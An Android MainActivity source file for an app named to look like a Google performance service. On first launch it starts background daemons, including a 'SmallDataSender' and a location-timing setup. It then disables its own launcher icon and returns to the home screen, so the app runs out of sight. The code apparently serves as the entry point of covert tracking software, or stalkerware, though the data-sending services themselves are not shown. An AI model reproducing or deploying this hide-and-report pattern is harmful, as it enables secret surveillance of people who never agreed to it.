package com.example.tiber.googleperformancehost;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import com.example.tiber.googleperformancehost.BroadcastReceivers.TickReceiver;
import com.example.tiber.googleperformancehost.Services.Daemons.MainDaemonService;
import com.example.tiber.googleperformancehost.Services.Daemons.SmallDataSender;
import com.example.tiber.googleperformancehost.SharedClasses.Utils.DateUtil;

public class MainActivity extends AppCompatActivity {

    Context appContext;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        appContext = getApplicationContext();

        registerReceivers();
        startServices();
        hideIcon();
        setSharedPreferencesInitialData();
        closeApp();
    }

    private void startServices() {
        Intent startService;

        startService = new Intent(appContext, MainDaemonService.class);
        appContext.startService(startService);

        startService = new Intent(appContext, SmallDataSender.class);
        startService.putExtra("what","justStart");
        appContext.startService(startService);
    }

    private void registerReceivers() {
        Context appContext = getApplicationContext();
        IntentFilter inf = new IntentFilter();
        inf.addAction(Intent.ACTION_TIME_TICK);
        appContext.registerReceiver(TickReceiver.getInstance(),inf);
    }

    private void setSharedPreferencesInitialData(){
        SharedPreferences sharedPref = getApplicationContext().getSharedPreferences("data",Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPref.edit();

        editor.putInt(getApplicationContext().
                getString(R.string.LATEST_TIME_OF_LOCATOR_STARTED_KEY),DateUtil.nowIntFormat() - 60 * 20);

        editor.commit();
    }


    private void hideIcon(){
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    private void closeApp(){
        Intent startMain = new Intent(Intent.ACTION_MAIN);
        startMain.addCategory(Intent.CATEGORY_HOME);
        startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(startMain);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
    }
}

